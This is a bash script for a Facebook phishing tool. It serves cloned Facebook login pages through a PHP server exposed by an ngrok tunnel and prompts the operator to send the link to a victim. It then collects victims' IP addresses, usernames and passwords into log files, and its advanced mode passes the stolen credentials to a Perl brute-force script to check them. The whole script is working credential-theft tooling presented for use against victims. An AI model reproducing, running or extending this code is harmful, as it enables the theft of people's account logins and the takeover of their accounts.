#!/bin/bash

trap 'printf "\n";stop;exit 1' 2
trap user_interrupt SIGINT
trap user_interrupt SIGTSTP

user_interrupt(){
        printf "\e[0m\n"
        printf "\e[0m\e[1;36m\t CTRL + C Pressed !!\n"
        sleep 2
        printf "\e[0m\n"
        printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44m Visit https://github.com/Mr-Yenoj for more\e[0m\n"
        printf "\e[0m\n"
        exit 1
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e .nexlink ]]; then
rm -rf .nexlink
fi

}

reqs() {

command -v perl > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Packages are not Installed ! type \e[0m\e[93mbash setup\e[0m\n\n"; exit 1; }
command -v php > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Packages are not Installed ! type \e[0m\e[93mbash setup\e[0m\n\n"; exit 1; }
command -v curl > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Packages are not Installed ! type \e[0m\e[93mbash setup\e[0m\n\n"; exit 1; }
command -v ssh > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Packages are not Installed ! type \e[0m\e[93mbash setup\e[0m\n\n"; exit 1; }
command -v unzip > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Packages are not Installed ! type \e[0m\e[93mbash setup\e[0m\n\n"; exit 1; }

}

banner() {

clear
printf "\e[0m\n"
printf "\e[0m\e[92m    _      ____   __     __  \e[0m\e[93m   _____    ____  \e[0m\n"
printf "\e[0m\e[92mU  / \  u |  _ \  \ \   / /u \e[0m\e[93m  |  ___|U | __ )u\e[0m\n"
printf "\e[0m\e[92m \/ _ \/ /| | | |  \ \ / //  \e[0m\e[93m U| |_  u \|  _ \/\e[0m\n"
printf "\e[0m\e[92m / ___ \ U| |_| |\ /\ V /_,-.\e[0m\e[93m \|  _|/   | |_) |\e[0m\n"
printf "\e[0m\e[92m/_/   \_\ |____/ uU  \_/-(_/  \e[0m\e[93m |_|      |____/ \e[0m\n"
printf "\e[0m\e[92m \\    >>  |||_     //       \e[0m\e[93m    )(\\,-  _|| \\_ \e[0m\n"
printf "\e[0m\e[92m(__)  (__)(__)_)   (__)      \e[0m\e[93m (__)(_/ (__) (__)\e[0m\n"
printf "\n"
printf "\e[1;93m.:.:.\e[0m\e[1;77m Phishing Tool coded by: @Mr-Yenoj \e[0m\e[1;93m.:.:.\e[0m\n"
printf "\e[0m\n"

}

menu() {

printf "      \e[0m\e[1;46m[::]  Select Option for Your Victim  [::]\e[0m\n"
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Facebook New Simple Phishing Page \e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Facebook Advance Phishing Page \e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m About Tool nd Option \e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m How To Use This Tool \e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m05\e[0m\e[1;31m]\e[0m\e[1;93m About Tool Developer \e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m00\e[0m\e[1;31m]\e[0m\e[1;93m Exit \e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' menu_option

if [[ $menu_option == 1 || $menu_option == 01 ]]; then
start_ngrok
elif [[ $menu_option == 2 || $menu_option == 02 ]]; then
advance_fb
elif [[ $menu_option == 3 || $menu_option == 03 ]]; then
Tool
elif [[ $menu_option == 4 || $menu_option == 04 ]]; then
Use
elif [[ $menu_option == 5 || $menu_option == 05 ]]; then
about
elif [[ $menu_option == 0 || $menu_option == 00 ]]; then
printf "\e[0m\n"
printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44m Visit https://github.com/Mr-yenoj for more\e[0m\n"
printf "\e[0m\n"
exit 1

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

about() {

clear
sleep 2
printf "\e[0m\n"
printf "\e[0m\e[93m    ___  _                 _   \e[0m\n"
printf "\e[0m\e[93m   / _ \| |               | |   \e[0m\n"
printf "\e[0m\e[93m  / /_\ \ |__   ___  _   _| |_  \e[0m\n"
printf "\e[0m\e[93m  |  _  | '_ \ / _ \| | | | __| \e[0m\n"
printf "\e[0m\e[93m  | | | | |_) | (_) | |_| | |_  \e[0m\n"
printf "\e[0m\e[93m  \_| |_/_.__/ \___/ \__,_|\__| \e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;44m Advanced Phishing Tool with Template \e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[92m  AUTHOR \e[0m\e[91m     :\e[0m\e[93m Mr. Yenoj \e[0m\e[91m[\e[0m\e[93m Creative hackers \e[0m\e[91m]\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[92m  GITHUB \e[0m\e[91m     : \e[0m\e[96mhttps://github.com/Mr-Yenoj\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[92m  Instagram \e[0m\e[91m  : \e[0m\e[96mhttps://www.instagram.com/creative_hackers/\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[92m  Youtube \e[0m\e[91m    : \e[0m\e[96mhttps://www.youtube.com/c/creativehackers/\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[92m  Version \e[0m\e[91m    : \e[0m\e[93m1.0\e[0m\n"
printf "\e[0m\n"
printf "         \e[0m\e[1;44m Follow Our Github For More Tools \e[0m\n"
printf "\e[0m\n"
printf "\e[0m\n"
sleep 3
printf " \e[0m\e[91m[\e[0m00\e[0m\e[91m]\e[0m\e[93m Home           \e[0m\e[91m[\e[0m99\e[0m\e[91m]\e[0m\e[93m Exit\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' about_option

if [[ $about_option == 0 || $about_option == 00 ]]; then
sleep 1
banner
menu
elif [[ $about_option == 99 ]]; then
sleep 1
printf "\e[0m\n"
printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44m Visit https://github.com/Mr-Yenoj for more\e[0m\n"
printf "\e[0m\n"
exit 1

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}

Tool() {

clear
sleep 2
printf "\e[0m\n"
printf "\e[0m\e[93m            _                 _     _______          _ \e[0m\n"
printf "\e[0m\e[93m      /\   | |               | |   |__   __|        | |\e[0m\n"
printf "\e[0m\e[93m     /  \  | |__   ___  _   _| |_     | | ___   ___ | |\e[0m\n"
printf "\e[0m\e[93m    / /\ \ | '_ \ / _ \| | | | __|    | |/ _ \ / _ \| |\e[0m\n"
printf "\e[0m\e[93m   / ____ \| |_) | (_) | |_| | |_     | | (_) | (_) | |\e[0m\n"
printf "\e[0m\e[93m  /_/    \_\_.__/ \___/ \__,_|\__|    |_|\___/ \___/|_|\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;44m Advanced Phishing Tool with Template \e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[92m  AUTHOR \e[0m\e[91m     :\e[0m\e[93m Mr. Yenoj \e[0m\e[91m[\e[0m\e[93m Creative hackers \e[0m\e[91m]\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[92m  GITHUB \e[0m\e[91m     : \e[0m\e[96mhttps://github.com/Mr-Yenoj\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[92m  Instagram \e[0m\e[91m  : \e[0m\e[96mhttps://www.instagram.com/creative_hackers/\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[92m  Youtube \e[0m\e[91m  : \e[0m\e[96mhttps://www.youtube.com/c/creativehackers/\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[92m  Version \e[0m\e[91m    : \e[0m\e[93m1.0\e[0m\n"
printf "\e[0m\n"

printf "                          \e[0m\e[1;44m What Is The Use Of This Tool \e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[91m This is the Phishing page Advanced Tool. Which Help you To hack Facebook account,\e[0m\n"
printf "\e[0m\e[91m In this you will get the id / password of Victim as well as the right id and password.\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[92m We Made This by Using 2 things Advance Phising and Bruteforce. This is Only created\e[0m\n"
printf "\e[0m\e[92m By \e[0m\e[96m Our Team Creative Hackers.\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[93m We have made it like the original Facebook Page and if Victim will put wrong information\e[0m\n"
printf "\e[0m\e[93m on phishing page then our Advance phising tool will tell it that your password is wrong\e[0m\n"
printf "\e[0m\e[93m or spelling mistake should enter the correct information as the real Facebook says!\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[90m We created This Tool so far has been created by no one and it is the latest versions,\e[0m\n"
printf "\e[0m\e[90m with the help of this you will get real login information !!\e[0m\n"
printf "\e[0m\n"
printf "                                     \e[0m\e[93m Thank you!\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\n"
sleep 3
printf " \e[0m\e[91m[\e[0m00\e[0m\e[91m]\e[0m\e[93m Home           \e[0m\e[91m[\e[0m99\e[0m\e[91m]\e[0m\e[93m Exit\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' about_option

if [[ $about_option == 0 || $about_option == 00 ]]; then
sleep 1
banner
menu
elif [[ $about_option == 99 ]]; then
sleep 1
printf "\e[0m\n"
printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44m Visit https://github.com/Mr-Yenoj for more\e[0m\n"
printf "\e[0m\n"
exit 1

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}


start_ngrok() {

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:5555\e[0m\e[1;91m )\e[0m\n"
sleep 1
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok ...\e[0m\n"
cd facebook && php -S localhost:1525 > /dev/null 2>&1 & 
sleep 2
./ngrok http 1525 > /dev/null 2>&1 &
sleep 10.0
ylink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $ylink

datafound
}

datafound() {

printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
printf "\n"
while [ true ]; do


if [[ -e "facebook/ip.txt" ]]; then
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found !\e[0m\n"
grab_ip
rm -rf facebook/ip.txt
fi
sleep 0.75
if [[ -e "facebook/usernames.txt" ]]; then
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Login info Found !!\e[0m\n"
grab_creds
rm -rf facebook/usernames.txt
fi
sleep 0.75


done

}

grab_ip() {

ip=$(grep -a 'IP:' facebook/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP:\e[0m\e[1;96m %s\e[0m\n" $ip
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m ip.saved.txt\e[0m\n" $server
printf "\n"
cat facebook/ip.txt >> ip.saved.txt

}

grab_creds() {

account=$(grep -o 'Username:.*' facebook/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' facebook/usernames.txt | cut -d ":" -f2)
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
cat facebook/usernames.txt >> id.saved.txt
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m logs/%s.log\e[0m\n" facebook
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Next Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"

}

advance_fb() {

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:5555\e[0m\e[1;91m )\e[0m\n"
sleep 1
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok ...\e[0m\n"
cd fb && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
sleep 2
./ngrok http 127.0.0.1:5555 > /dev/null 2>&1 &
sleep 7
xlink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $xlink

fffound
}

fffound() {

printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
printf "\n"
while [ true ]; do


if [[ -e "fb/ip.txt" ]]; then
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found !\e[0m\n"
grabdataip
rm -rf fb/ip.txt
fi
sleep 0.75
if [[ -e "fb/usernames.txt" ]]; then
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Login info Found !!\e[0m\n"
grabdata
rm -rf fb/usernames.txt
rm -rf fb/pass.txt
fi
sleep 0.75


done

}

grabdataip() {

ip=$(grep -a 'IP:' fb/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP:\e[0m\e[1;96m %s\e[0m\n" $ip
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m ip.txt\e[0m\n" $server
printf "\n"
cat fb/ip.txt >> ip.txt

}

grabdata() {

account=$(grep -o '.*' fb/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o '.*' fb/pass.txt | cut -d ":" -f2)
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Plz Wait We Are Checking Victim Id nd Pass.... \e[0m\e[1;96m %s\e[0m\n"
cat fb/usernames.txt >> id.log
cat fb/pass.txt >> pass.log
perl fb-brute.pl $account fb/pass.txt
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m id.log nd pass.log \e[0m\n" fb
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Next Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"

}

banner
reqs
menu
